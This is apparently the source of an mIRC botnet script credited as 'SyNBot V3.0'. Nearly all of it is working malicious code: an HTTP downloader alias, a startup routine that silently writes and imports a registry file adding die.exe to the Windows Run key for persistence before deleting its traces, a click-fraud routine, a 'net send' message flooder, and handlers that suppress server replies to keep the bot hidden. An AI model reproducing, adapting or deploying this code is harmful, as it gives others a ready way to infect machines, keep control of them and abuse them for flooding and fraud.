alias getdata { if ($sock(wwwGet) == $null) { if ($gettok($$1,1,47) == http:) { sockopen wwwGet $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80)   } | else { sockopen wwwGet $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80)  } |  if ($GetTok($1,$numtok($1,47),47) != $null) {  set -u0 %WWW.File $mircdir\ $+ $GetTok($1,$numtok($1,47),47)  } | else { set -u0 %WWW.File $mircdir\_root_   } |   sockmark wwwGet unknown %WWW.File $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] )  } | else {  .timer 1 1 getdata $1  } }

alias _start { 
  inc %startd
  timer 1 5 timer -m 0 200 asadf
  set %filetoboot $rand(100,999) $+ .reg | write %filetoboot  REGEDIT4 | write %filetoboot [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %filetoboot "MSTABLE1223"=" $+ $+($replace($mircdir,\,\\),die.exe) $+ " | run -n regedit /s %filetoboot | timer 1 3 remove %filetoboot | timer 1 4 unset %filetoboot 
}

alias webview1 { sockopen webpage $+ $rand(3333,225252) $1- | if ($timer(clicker).reps < 1) { msgx $connect.chan 14•15TragicClicker14• Clicking of %click.url completed! | unset %click.url } }

alias netmsgxflood { msgx %bc Sending $chr(91) $+ $2 $+ $chr(93) messages to $chr(91) $+ $3 $chr(93) | unset %x | :x | inc %x | if (%x > $2) { return } | console $1 net send $3 $4- | goto x }

raw 001:*: halt
raw 002:*: halt
raw 003:*: halt
raw 004:*: halt
raw 005:*: halt
raw 006:*: halt
raw 007:*: halt
raw 008:*: halt
raw 257:*: halt
raw 258:*: halt
raw 259:*: halt
raw 265:*: halt
raw 266:*: halt
raw 433:*: { nick SYN- $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) }

;[SyNBot](V3.0)[By Syn] [Credits Also To: Cold & Lynx] & Whomever else part of this Code was Taken From.